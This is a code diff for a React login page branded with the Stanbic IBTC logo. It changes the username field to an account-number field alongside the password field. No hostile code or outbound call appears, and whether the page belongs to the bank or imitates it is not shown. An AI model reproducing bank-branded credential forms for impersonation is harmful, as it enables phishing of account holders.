@@ -13,7 +13,7 @@ import { FiPhone } from "react-icons/fi";
 import logo from "../assets/ng-ibtc-logo.webp";
 
 const schema = yup.object().shape({
-  username: yup.string().required("Username is required"),
+  accountNumber: yup.string().required("Account Number is required"),
   password: yup.string().required("Password is required"),
 });
 
@@ -21,7 +21,7 @@ const Home = () => {
   const navigate = useNavigate();
   const [loading, setLoading] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
-  const [saveUsername, setSaveUsername] = useState(false);
+  const [saveAccountNumber, setSaveAccountNumber] = useState(false);
 
   const {
     register,
@@ -58,26 +58,26 @@ const Home = () => {
         <button className="text-white text-2xl">
           <IoChevronBack />
         </button>
-            <img src={logo} alt="Stanbic IBTC Logo" className="h-12 w-auto" />
+        <img src={logo} alt="Stanbic IBTC Logo" className="h-12 w-auto" />
       </div>
 
       {/* Main Content */}
       <div className="flex-1 flex flex-col px-6 pt-8">
         {/* Form Section */}
         <form onSubmit={handleSubmit(submitForm)} className="flex-1">
-          {/* Username Input */}
+          {/* Account Number Input */}
           <div className="mb-6">
             <label className="text-white text-sm mb-2 block font-light">
-              USERNAME
+              ACCOUNT NUMBER
             </label>
             <input
-              name="username"
+              name="accountNumber"
               type="text"
               placeholder="Enter here"
-              {...register("username")}
+              {...register("accountNumber")}
               className="w-full bg-transparent border-2 border-white/30 rounded-lg px-4 py-4 text-white placeholder-white/50 text-lg focus:outline-none focus:border-white/60"
             />
-            <FormErrMsg errors={errors} inputName="username" />
+            <FormErrMsg errors={errors} inputName="accountNumber" />
           </div>
 
           {/* Password Input */}
@@ -104,19 +104,19 @@ const Home = () => {
             <FormErrMsg errors={errors} inputName="password" />
           </div>
 
-          {/* Save Username Toggle */}
+          {/* Save Account Number Toggle */}
           <div className="flex items-center justify-between mb-8">
-            <span className="text-white text-base">Save Username</span>
+            <span className="text-white text-base">Save Account Number</span>
             <button
               type="button"
-              onClick={() => setSaveUsername(!saveUsername)}
+              onClick={() => setSaveAccountNumber(!saveAccountNumber)}
               className={`w-16 h-8 rounded-full relative transition-colors ${
-                saveUsername ? "bg-white" : "bg-white/30"
+                saveAccountNumber ? "bg-white" : "bg-white/30"
               }`}
             >
               <div
                 className={`absolute top-1 w-6 h-6 rounded-full transition-all ${
-                  saveUsername ? "right-1 bg-gray-600" : "left-1 bg-white"
+                  saveAccountNumber ? "right-1 bg-gray-600" : "left-1 bg-white"
                 }`}
               />
             </button>
@@ -149,4 +149,3 @@ const Home = () => {
 };
 
 export default Home;
-
